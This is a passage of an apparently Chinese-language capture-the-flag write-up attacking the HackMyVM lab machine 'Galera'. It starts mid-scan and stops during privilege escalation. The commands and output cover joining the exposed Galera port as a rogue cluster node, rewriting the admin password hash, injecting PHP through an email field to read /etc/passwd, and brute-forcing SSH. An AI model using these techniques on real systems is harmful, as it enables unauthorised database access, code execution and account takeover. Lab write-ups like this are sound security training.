T -min-rate 10000 192.168.56.66\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-05-30 23:58 CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.66\nHost is up (0.00081s latency).\nNot shown: 997 closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n4567/tcp open  tram\nMAC Address: 08:00:27:8F:84:E1 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 13.26 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Galera nmap -sT -A 192.168.56.66\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-05-31 00:00 CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.66\nHost is up (0.00042s latency).\nNot shown: 997 closed tcp ports (conn-refused)\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)\n| ssh-hostkey:\n|   256 28:50:32:2f:bb:ef:7e:51:c3:59:cb:e6:40:88:0e:4e (ECDSA)\n|_  256 f3:fa:a1:84:c6:da:\u003cspan class=\"hljs-built_in\"\u003efc\u003c/span\u003e:09:fe:aa:ca:ec:0a:29:7d:30 (ED25519)\n80/tcp   open  http    Apache httpd 2.4.62 ((Debian))\n|_http-title: Login\n|_http-server-header: Apache/2.4.62 (Debian)\n4567/tcp open  tram?\n| fingerprint-strings:\n|   GenericLines:\n|     )ALz\n|   GetRequest:\n|     ,6_V\n|   HTTPOptions:\n|_    N\\rjt\n....\nMAC Address: 08:00:27:8F:84:E1 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nDevice \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e: general purpose|router\nRunning: Linux 4.X|5.X, MikroTik RouterOS 7.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3\nOS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.42 ms 192.168.56.66\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 58.59 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e4567 - Galera\u003c/h2\u003e\n\u003cp\u003e扫描到一个没见过的端口，搜索引擎上线！！\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMGalera/image.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e可以看到搜索结果都是带着靶机的名字，所以该端口应该就是突破口\u003c/p\u003e\n\u003cp\u003e通过了解后知道：Galera 复制是基于同步多源 \u003cstrong\u003eMariaDB Galera集群\u003c/strong\u003e \u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://docs.redhat.com/zh-cn/documentation/red_hat_enterprise_linux/9/html/configuring_and_using_database_servers/replicating-mariadb-with-galera_using-mariadb\"\u003ehttps://docs.redhat.com/zh-cn/documentation/red_hat_enterprise_linux/9/html/configuring_and_using_database_servers/replicating-mariadb-with-galera_using-mariadb\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003cstrong\u003eMariaDB Galera 集群\u003c/strong\u003e 的主要特性是 ：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e同步复制\u003c/li\u003e\n\u003cli\u003e主动-主动多源拓扑\u003c/li\u003e\n\u003cli\u003e对任何集群节点的读和写\u003c/li\u003e\n\u003cli\u003e自动成员资格控制，故障节点从集群中删除\u003c/li\u003e\n\u003cli\u003e自动节点加入\u003c/li\u003e\n\u003cli\u003e行一级的并行复制\u003c/li\u003e\n\u003cli\u003e直接客户端连接：用户可以登录到集群节点，并在复制运行时直接使用这些节点\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e大概就是我们可以尝试将自己加入到集群中，然后就可以访问源数据库中的数据\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Galera \u003cspan class=\"hljs-built_in\"\u003ecp\u003c/span\u003e /etc/mysql/mariadb.conf.d/60-galera.cnf /etc/mysql/mariadb.conf.d/60-galera.cnf.bak\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e根据\u003ccode\u003eGPT\u003c/code\u003e生成的配置（将需要指定的配置全都删掉了）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e[galera]\nwsrep_on = ON\nwsrep_provider = /usr/lib/galera/libgalera_smm.so\nwsrep_cluster_address = \u003cspan class=\"hljs-string\"\u003e\"gcomm://192.168.56.66:4567\"\u003c/span\u003e\nwsrep_node_name = \u003cspan class=\"hljs-string\"\u003e\"sunset\"\u003c/span\u003e\nwsrep_node_address = \u003cspan class=\"hljs-string\"\u003e\"192.168.56.5\"\u003c/span\u003e     \u003cspan class=\"hljs-comment\"\u003e# 本机IP\u003c/span\u003e\nbinlog_format = row\ndefault_storage_engine = InnoDB\nwsrep_sst_method = rsync\nbind-address = 0.0.0.0\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e重启数据库\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Galera systemctl restart mariadb\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e然后登录进去数据库，能看到同步过来了\u003ccode\u003egaleradb\u003c/code\u003e 数据库\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Galera mysql -uroot -p\nEnter password: \nWelcome to the MariaDB monitor.  Commands end with ; or \\g.\nYour MariaDB connection \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e is 9\nServer version: 11.8.1-MariaDB-4 Debian n/a\n\nCopyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.\n\nSupport MariaDB developers by giving a star at https://github.com/MariaDB/server\nType \u003cspan class=\"hljs-string\"\u003e'help;'\u003c/span\u003e or \u003cspan class=\"hljs-string\"\u003e'\\h'\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ehelp\u003c/span\u003e. Type \u003cspan class=\"hljs-string\"\u003e'\\c'\u003c/span\u003e to clear the current input statement.\n\nMariaDB [(none)]\u003e show databases;\n+--------------------+\n| Database           |\n+--------------------+\n| galeradb           |\n| information_schema |\n| mysql              |\n| performance_schema |\n| sys                |\n+--------------------+\n5 rows \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e (0.006 sec)\n\nMariaDB [(none)]\u003e \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e能找到用户表\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eMariaDB [galeradb]\u003e \u003cspan class=\"hljs-keyword\"\u003eselect\u003c/span\u003e * from \u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e;\n+----+----------+------------------+--------------------------------------------------------------+---------------------+\n| \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e | username | email            | password                                                     | created_at          |\n+----+----------+------------------+--------------------------------------------------------------+---------------------+\n|  1 | admin    | admin@galera.hmv | $2y$10\u003cspan class=\"hljs-variable\"\u003e$BCAQ6VSNOL9TzfE5\u003c/span\u003e/dnVmuc9R5PotwClWAHwRdRAt7RM0d9miJRzq | 2025-05-05 07:55:51 |\n+----+----------+------------------+--------------------------------------------------------------+---------------------+\n1 row \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e (0.002 sec)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e我们不爆破了，直接更新其密码\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMGalera/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eMariaDB [galeradb]\u003e update \u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e password = \u003cspan class=\"hljs-string\"\u003e'$2a$10$xxFez17bX.RtTFPdER3.P.KmUtS6XYxkOrbXH7p65WzB4H2AFQpCi'\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ewhere\u003c/span\u003e username = \u003cspan class=\"hljs-string\"\u003e'admin'\u003c/span\u003e;\nQuery OK, 1 row affected (0.004 sec)\nRows matched: 1  Changed: 1  Warnings: 0\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eWeb 渗透\u003c/h2\u003e\n\u003cp\u003e更新密码后，我们的到了新的用户，应该是在\u003ccode\u003eWeb\u003c/code\u003e 上能用上的\u003c/p\u003e\n\u003cp\u003e访问 \u003ccode\u003e80\u003c/code\u003e 端口\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMGalera/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e存在登录框，我们使用刚刚得到的用户进行登录\u003c/p\u003e\n\u003cp\u003e成功进入到后台，后台是有一个能发布信息的功能，但是貌似没什么用处\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMGalera/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e先对其进行目录扫描\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Galera feroxbuster --url http://192.168.56.66 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --filter-status 404,403 -x php,zip,txt\n\n ___  ___  __   __     __      __         __   ___\n|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__\n|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___\nby Ben \u003cspan class=\"hljs-string\"\u003e\"epi\"\u003c/span\u003e Risher 🤓                 ver: 2.11.0\n───────────────────────────┬──────────────────────\n 🎯  Target Url            │ http://192.168.56.66\n 🚀  Threads               │ 50\n 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n 💢  Status Code Filters   │ [404, 403]\n 💥  Timeout (secs)        │ 7\n 🦡  User-Agent            │ feroxbuster/2.11.0\n 💉  Config File           │ /etc/feroxbuster/ferox-config.toml\n 🔎  Extract Links         │ \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n 💲  Extensions            │ [php, zip, txt]\n 🏁  HTTP methods          │ [GET]\n 🔃  Recursion Depth       │ 4\n───────────────────────────┴──────────────────────\n 🏁  Press [ENTER] to use the Scan Management Menu™\n──────────────────────────────────────────────────\n404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n200      GET       62l      115w     1055c http://192.168.56.66/style.css\n200      GET       26l       57w      825c http://192.168.56.66/index.php\n302      GET        0l        0w        0c http://192.168.56.66/login.php =\u003e http://192.168.56.66/\n301      GET        9l       28w      315c http://192.168.56.66/upload =\u003e http://192.168.56.66/upload/\n200      GET    10495l    65816w  5238944c http://192.168.56.66/galera.png\n200      GET       26l       57w      825c http://192.168.56.66/\n200      GET      861l     4482w    77306c http://192.168.56.66/info.php\n302      GET        0l        0w        0c http://192.168.56.66/logout.php =\u003e index.php\n200      GET        0l        0w        0c http://192.168.56.66/config.php\n[####################] - 4m   1764404/1764404 0s      found:9       errors:2\n[####################] - 4m    882184/882184  3335/s  http://192.168.56.66/\n[####################] - 4m    882184/882184  3314/s  http://192.168.56.66/upload/\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e访问 \u003ccode\u003einfo.php\u003c/code\u003e ，是 \u003ccode\u003ephpinfo()\u003c/code\u003e的输出\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMGalera/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e也没拿到什么有用的信息\u003c/p\u003e\n\u003cp\u003e本来想测试 \u003ccode\u003eMessage\u003c/code\u003e 的信息会不会写入表中然后同步，但是也并没有\u003c/p\u003e\n\u003cp\u003e然后可以注意到，后台中输出的用户信息只有用户的邮箱，因此这里可能会存在注入或者 PHP 代码执行等漏洞，我们对其进行\u003ccode\u003eFuzz\u003c/code\u003e ，最后发现其可以解析 \u003ccode\u003ePHP\u003c/code\u003e语句\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eMariaDB [galeradb]\u003e \u003cspan class=\"hljs-keyword\"\u003eselect\u003c/span\u003e * from \u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e;\n+----+----------+----------------------+--------------------------------------------------------------+---------------------+\n| \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e | username | email                | password                                                     | created_at          |\n+----+----------+----------------------+--------------------------------------------------------------+---------------------+\n|  1 | admin    | \u0026#x3C;?php \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"test\"\u003c/span\u003e;?\u003e | $2a$10\u003cspan class=\"hljs-variable\"\u003e$xxFez17bX\u003c/span\u003e.RtTFPdER3.P.KmUtS6XYxkOrbXH7p65WzB4H2AFQpCi | 2025-05-05 07:55:51 |\n+----+----------+----------------------+--------------------------------------------------------------+---------------------+\n1 row \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e (0.001 sec)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMGalera/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e但是从之前 \u003ccode\u003ephpinfo\u003c/code\u003e 的信息中能看到有很多限制，基本都\u003ccode\u003eban\u003c/code\u003e掉了\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMGalera/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e虽然给禁用了很多的命令执行函数，可以尝试绕过\u003c/p\u003e\n\u003cp\u003e我们再看一下伪协议\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMGalera/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e读取文件的伪协议没有被禁用\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u0026#x3C;?php include(\u003cspan class=\"hljs-string\"\u003e'php://filter/convert.base64-encode/resource=/etc/passwd'\u003c/span\u003e);?\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eMariaDB [galeradb]\u003e update \u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e email = \u003cspan class=\"hljs-string\"\u003e\"\u0026#x3C;?php include('php://filter/convert.base64-encode/resource=/etc/passwd');?\u003e\"\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ewhere\u003c/span\u003e username = \u003cspan class=\"hljs-string\"\u003e'admin'\u003c/span\u003e;\nQuery OK, 1 row affected (0.006 sec)\nRows matched: 1  Changed: 1  Warnings: 0\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e成功读取\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMGalera/image8.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e解码后发现一个新用户 \u003ccode\u003edonjuandeaustria\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMGalera/image9.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003eHydra\u003c/h2\u003e\n\u003cp\u003e拿\u003ccode\u003eshell\u003c/code\u003e很麻烦，所以我直接超级爆破\u003c/p\u003e\n\u003cp\u003e一段时间后密码就出来了 \u003cstrong\u003e\u003ccode\u003eamorcito\u003c/code\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMGalera/image10.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e登录进去后能读取 \u003ccode\u003euser.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003edonjuandeaustria@galera:~$ \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e\ndonjuandeaustria.png  user.txt\n\ndonjuandeaustria@galera:~$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e user.txt \n072f9d8c26547db59e65d7aa3e55747b\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e提权\u003c/h2\u003e\n\u003cp\u003e当前目录下还有一张图片，尝试从文件中截取数据\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Galera binwalk donjuandeaustria.png \n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n0             0x0             PNG image, 1024 x 1024, 8-bit/color RGB, non-interlaced\n1195          0x4AB           Certificate \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e DER format (x509 v3), header length: 4, sequence length: 819\n2021          0x7E5           Certificate \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e DER format (x509 v3), header length: 4, sequence length: 1146\n14398         0x383E          JPEG image data, JFIF standard 1.02\n65084         0xFE3C          Certificate \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e DER format (x509 v3), header length: 4, sequence length: 819\n65910         0x10176         Certificate \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e DER format (x509 v3), header length: 4, sequence length: 1146\n78457         0x13279         Zlib compressed data, default compression\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e没有收获，继续寻找\u003c/p\u003e\n\u003cp\u003e发现 \u003ccode\u003eroot\u003c/code\u003e 用户登录在 \u003ccode\u003etty20\u003c/code\u003e 中\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003edonjuandeaustria@galera:/dev$ \u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e \ndonjuandeaustria root\ndonjuandeaustria@galera:/dev$ \u003cspan class=\"hljs-built_in\"\u003ewho\u003c/span\u003e\nroot     tty20        2025-05-31 05:45\ndonjuandeaustria pts/0        2025-05-31 07:47 (192.168.56.5)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e并且我们属于 \u003ccode\u003etty\u003c/code\u003e 组\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003edonjuandeaustria@galera:/dev$ \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e\nuid=1000(donjuandeaustria) gid=1000(donjuandeaustria) \u003cspan class=\"hljs-built_in\"\u003egroups\u003c/span\u003e=1000(donjuandeaustria),5(\u003cspan class=\"hljs-built_in\"\u003etty\u003c/span\u003e),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(\u003cspan class=\"hljs-built_in\"\u00
